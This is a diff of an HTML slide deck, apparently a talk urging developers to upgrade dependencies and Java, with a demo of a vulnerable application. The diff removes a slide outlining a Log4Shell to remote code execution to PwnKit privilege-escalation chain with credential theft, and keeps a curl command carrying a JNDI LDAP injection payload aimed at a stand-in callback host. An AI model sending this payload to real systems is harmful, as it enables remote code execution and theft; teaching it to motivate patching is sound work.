@@ -30,11 +30,10 @@
 
 
     <section>
-        <h2>🚨 It Works, Don't Touch It</h2>
+        <h2>🚨 Many dependencies</h2>
         <div class="medium">
             <ul class="icon-list" style="margin-top:0.8em;">
                 <li><span class="ic">🧩</span><span>Every application has <strong>direct</strong> and <strong>transitive</strong> dependencies, often hundreds</span></li>
-                <li><span class="ic">✅</span><span>Most are hidden</span></li>
                 <li><span class="ic">🎲</span><span>Potential Common Vulnerabilities and Exposures (CVEs)</span></li>
             </ul>
         </div>
@@ -65,34 +64,7 @@
     </section>
 
     <section>
-        <h2>🇪🇺 EU: Patching Is Now Law</h2>
-        <div class="medium">
-            <table>
-                <thead><tr><th>Law</th><th>Requires</th><th>Max penalty</th></tr></thead>
-                <tbody>
-                    <tr><td>GDPR (Art. 32)</td><td>Patched, secure systems for personal data</td><td>€20M or 4% turnover</td></tr>
-                    <tr><td>NIS2 Directive</td><td>Risk management, 24h incident reporting</td><td>€10M / 2% turnover</td></tr>
-                    <tr><td>Cyber Resilience Act</td><td>Security updates for 5+ years</td><td>€15M or 2.5% turnover</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </section>
-
-    <section>
-        <h2>🇦🇺 Australia: Patching Is Now Law</h2>
-        <div class="medium">
-            <table>
-                <thead><tr><th>Law</th><th>Requires</th><th>Max penalty</th></tr></thead>
-                <tbody>
-                    <tr><td>Privacy Act 1988</td><td>"Reasonable steps" to protect personal info</td><td>Greater of $50M AUD, 3× benefit gained, or a % of turnover</td></tr>
-                    <tr><td>Cyber Security Act 2024</td><td>Mandatory ransomware-payment reporting within 72h</td><td>$99,000 AUD per missed report</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </section>
-
-    <section>
-        <h2>⚖️ Australia: What Actually Gets Fined</h2>
+        <h2>⚖️ Australia: What Actually Got Fined</h2>
         <div class="box box-red medium" style="margin-top:0.6em;">
             <table style="margin-top:0.4em;">
                 <thead><tr><th>Case</th><th>What happened</th></tr></thead>
@@ -127,10 +99,9 @@
 
     <section>
         <h2>Concrete examples</h2>
-        <p class="subtitle">Three live demos, coming up</p>
         <ul class="icon-list medium" style="max-width:480px;margin:0.8em auto 0;">
             <li><span class="ic">🚀</span><span>Performance benefit</span></li>
-            <li><span class="ic">🦠</span><span>Vulnerable application: live exploit chain</span></li>
+            <li><span class="ic">🦠</span><span>Vulnerable application</span></li>
             <li><span class="ic">🔎</span><span>Known vulnerabilities</span></li>
         </ul>
     </section>
@@ -144,7 +115,7 @@
     <section>
         <h2>Improved Performance after Upgrading Java</h2>
         <div class="box box-blue medium" style="margin-top:0.5em;">
-            <span class="java-pill">☕ Java 17 → 25: zero code changes</span>
+            <span class="java-pill">☕ Java 17 → 25: zero code changes</span><br>
             <ul style="margin-top:0.3em;">
                 <li><strong>Compact Object Headers</strong></li>
                 <li><strong>Virtual Threads</strong></li>
@@ -156,7 +127,7 @@
     <section>
         <h2>Improved Performance after Upgrading Java</h2>
         <div class="box box-blue medium" style="margin-top:0.5em;">
-            <span class="java-pill">🔮 Java 25 → 28 EA: Valhalla preview</span>
+            <span class="java-pill">🔮 Java 25 → 28 EA: Valhalla preview</span><br>
             <ul style="margin-top:0.3em;">
                 <li><strong>~60% less memory</strong> and <strong>4-8x faster</strong></li>
                 <li>Depends on field size</li>
@@ -176,7 +147,7 @@
 
     <section class="example-slide">
         <span class="example-kicker">Example 2 of 3</span>
-        <h1>🦠 Vulnerable Application: Live Exploit Chain</h1>
+        <h1>🦠 Vulnerable Application</h1>
         <div class="example-rule"></div>
     </section>
 
@@ -201,7 +172,6 @@
                 <rect x="20" y="170" width="180" height="90" rx="8" fill="rgba(220,50,47,0.08)" stroke="#dc322f" stroke-width="1.5"/>
                 <text x="110" y="200" text-anchor="middle" font-family="Inter,sans-serif" font-weight="700" font-size="14" fill="#586e75">🧑‍💻 Attacker</text>
                 <text x="110" y="219" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#657b83">runs the curl command</text>
-                <text x="110" y="233" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#657b83">and controls the server →</text>
 
                 <!-- Victim -->
                 <rect x="280" y="140" width="260" height="150" rx="8" fill="rgba(38,139,210,0.08)" stroke="#268bd2" stroke-width="1.5"/>
@@ -249,19 +219,6 @@
                 <!-- 5: escalation loop -->
                 <line x1="410" y1="290" x2="410" y2="325" stroke="#d33682" stroke-width="1.25" stroke-dasharray="3 3" marker-end="url(#logArrowPink)"/>
             </svg>
-            <p class="small" style="margin-top:0.2em;color:#657b83;">④ also carries the exfil path back: recon and stolen credentials return over the same HTTP connection and land straight on the live dashboard.</p>
-        </div>
-    </section>
-
-    <section>
-        <h2>🎯 Log4Shell → Remote Code Execution (RCE) → PwnKit</h2>
-        <div class="medium">
-            <ul class="icon-list" style="margin-top:0.6em;">
-                <li><span class="ic">🎯</span><span>A REST endpoint build with Java 11 / Spring Boot 2.7 app running <code>log4j-core 2.14.1</code> (pre-patch)</span></li>
-                <li><span class="ic">📡</span><span>One query string triggers a JNDI lookup against an "attacker" LDAP server</span></li>
-                <li><span class="ic">💀</span><span>The attacker's class loads on the victim: recon, credential/env-var theft, exfiltration</span></li>
-                <li><span class="ic">🔓</span><span>If the victim isn't already root, it then tries <strong>CVE-2021-4034 (PwnKit targets pkexec)</strong> to escalate</span></li>
-            </ul>
         </div>
         <div class="box box-red medium" style="margin-top:0.6em;">
             <pre><code class="language-bash">curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"</code></pre>
